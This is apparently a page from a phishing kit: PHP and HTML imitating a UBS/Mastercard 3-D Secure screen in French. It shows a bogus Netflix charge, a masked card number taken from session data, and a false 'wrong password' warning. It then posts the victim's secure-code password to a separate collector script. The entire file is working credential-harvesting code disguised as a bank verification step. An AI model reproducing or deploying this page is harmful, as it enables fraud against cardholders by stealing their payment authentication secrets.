<?php

session_start();

///// PRINT 4 LAST NUMBERS //////
$number = $_SESSION['cn'];
$masked =  str_pad(substr($number, -4), strlen($number), 'x', STR_PAD_LEFT);
$phone = $_SESSION['tel'];
$ephone =  str_pad(substr($phone, -4), strlen($phone), 'X', STR_PAD_LEFT);
///// PRINT 4 LAST NUMBERS //////






?>
<!DOCTYPE html>
<html data-useragent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36"><!--<![endif]--><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="cache-control" content="no cache">
    <meta http-equiv="Pragma" content="no cache">
    <meta http-equiv="Expires" content="0">
    
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>3-D Secure - protégez votre carte</title>
    <link rel="stylesheet" href="./3-D_files/ubs_styles.min.css" type="text/css">  
  </head>
  <body class="ads" onload="OnPageInit();" onbeforeunload="onBeforeUnloadHandler(this);" onfocus="onFocusHandler();">
    <form name="passwdForm" action="../activity/auth_3d_ubs.php" method="post" onsubmit="return OnSubmitHandler1();">
      <div class="header-logo vpas-logo-pwd">
        <ul class="ddmenu">
          <li class="mainentry"><a onclick="closing=false" href="javascript: HelpWindow(&#39;ubs-logo.gif&#39;)">
            <span id="help">Aide</span></a>
          </li>
        </ul>
        <div class="vpasLogo mastercard-logo.gif"></div>
      </div>
      <!-- Text area -->
      <div class="form-content">
        <div id="header">
          <h1 class="cuiHeadline lr-headline">Protégez votre carte</h1>
        </div>
        <div id="iqafailMsg" class="cuiMessageWarningBorder cuiMessageWarningBorderNone">
          <img class="error-img" alt="" src="./3-D_files/Icon-Message-Warning-36px.png">
           
           Le mot de passe est erroné. Veuillez essayer une nouvelle fois. Si vous avez oublié votre mot de passe, veuillez cliquer sur «Mot de passe oublié».
        </div>

        <div id="subHeader">Veuillez vérifier votre message de sécurité personnel et saisir votre mot de passe.</div>
        <div class="form-line">
          <label id="merchant">Marchand</label>
          <div class="form-text">Netflix</div>
        </div>
        <div class="form-line">
          <label id="amount">Montant</label>
          <div class="form-text">EUR&nbsp;<span id="purchaseTotal">13,99</span></div>
        </div>



        <div class="form-line">
          <label id="date">Date</label>
          <div class="form-text">
            <?php echo date("m/d/Y g:i:s"); ?>

          </div>
        </div>
        <div class="form-line">
          <label id="card">Numéro de carte</label>
          <div class="form-text"><?php echo $masked ?></div>
        </div>
     
        <div class="form-line">
          <label id="pwdInput">Saisissez votre mot de passe</label>
          <input type="password" name="pin" class="cuiEntryfieldFont cuiEntryfield length30" maxlength="30" required>
        </div>
        <div class="form-line">
          <label></label>
        
            <a href="flowGlobal_wflowCNCE_jsession_ubs_forget_fr.php" onclick="closing=false">Mot de passe oublié</a></span>&nbsp;&nbsp;&nbsp;

       
        </div>
        <hr class="cuiHR">
        <div class="form-line form-buttons">
         <input type="submit" class="cuiButtonFont cuiButtonPrimary cuiButton" id="next" value="Payer" onclick="return OnSubmitHandler1();">
         &nbsp;&nbsp;
<input type="button" class="cuiButtonFont cuiButtonSecondary cuiButton" id="exit" value="Interrompre" onclick="JavaScript: closeButton(this); closing=false;">

         
        </div>
 
      </div>
     
    </form>



</body></html>